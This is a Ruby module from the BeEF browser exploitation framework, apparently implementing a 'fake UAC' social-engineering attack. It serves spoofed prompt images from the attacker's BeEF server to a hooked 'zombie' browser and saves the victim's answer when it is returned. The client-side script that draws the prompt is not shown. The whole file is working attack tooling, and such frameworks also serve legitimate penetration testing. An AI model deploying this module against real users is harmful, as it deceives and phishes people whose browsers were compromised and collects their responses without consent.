class Fake_uac < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_uac/assets/iedropbg.png','/fake_uac/iedropbg','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_uac/assets/user.png','/fake_uac/user','png')
  end
  
  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
    base_host = "#{proto}://#{beef_host}:#{beef_port}"

    return [
      {'name' => 'bind_url', 'ui_label'=>'Bind folder URL', 'type' => 'text', 'value' => "#{base_host}/fake_uac/" },
    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({'answer' => @datastore['answer']})
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/fake_uac/user.png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/fake_uac/iedropbg.png')
  end
  
end
